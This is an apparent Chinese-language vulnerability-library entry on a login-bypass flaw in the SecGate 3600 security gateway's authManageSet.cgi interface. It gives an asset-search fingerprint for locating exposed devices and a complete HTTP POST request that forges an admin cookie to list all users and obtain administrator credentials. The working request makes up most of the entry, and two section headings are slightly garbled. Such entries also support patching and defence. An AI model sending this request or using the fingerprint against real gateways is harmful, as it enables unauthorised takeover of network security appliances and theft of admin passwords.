---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 网神SecGata 3600安全网关authManageSet.cgi 接口登录绕过漏洞

# 一、漏洞简介
SecGate3600是网神信息技术(北京)股份有限公司旗下一款安全网关产品，网神 SecGate3600 存在登录绕过漏洞，攻击者利用该漏洞可获取管理员密码等敏感信息，进一步控制系统。

# 二、漏洞简介
+ 网神SecGata 3600-A1500

# 三、资产测绘
+ hunter`web.body="sec_gate_image/login_02.gif"`
+ 特征


# 四、漏洞复现
```java
POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
Host: {hostname}
Content-Type: application/x-www-form-urlencoded
Cookie: sw_login_name=admin
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lz3gvfl7e9gp74wi>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
